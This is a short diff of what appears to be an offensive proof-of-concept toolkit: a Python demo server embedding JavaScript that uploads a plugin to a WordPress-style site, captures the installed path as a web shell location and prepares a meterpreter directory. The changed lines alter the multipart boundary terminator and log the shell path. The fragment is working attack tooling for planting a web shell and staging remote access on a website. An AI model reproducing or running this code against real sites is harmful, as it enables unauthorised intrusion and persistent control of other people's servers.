@@ -354,7 +354,7 @@ function installYertleShell()
 			body += "--" + boundary + "\\r\\n";
 			body += 'Content-Disposition: form-data; name="install-plugin-submit"' + "\\r\\n\\r\\n";
 			body += "Install Now" + "\\r\\n";
-			body += boundary + "--\\r\\n\\r\\n";
+			body += boundary + "\\r\\n\\r\\n";
 
 			var aBody = new Uint8Array(body.length);
 			for (var i = 0; i < aBody.length; i++)
@@ -393,10 +393,11 @@ def seven():
 					var startIndex = response.indexOf('<p>Plugin installed successfully.</p>');
 					var endIndex   = response.indexOf('target="_parent">Activate Plugin</a>');
 					var pluginPath = response.substring(startIndex + 119, endIndex-26);
-	
+
 					pluginPath = pluginPath.replace("%2F", "/");
 					window.webShellPath = pluginPath;
-	
+					console.log("Plugin path is: " + pluginPath);
+
 					// Pull the directory name out so we can
 					// set the meterpreter directory
 					var pluginDir = pluginPath.split("/");
@@ -724,7 +725,6 @@ def handleInput(input):
 
 def main():
 	print "Demo code DJ ready to serve up some wonky POCs baby"
-
 
 	while True:
 		userInput = input("So whatcha want? ")
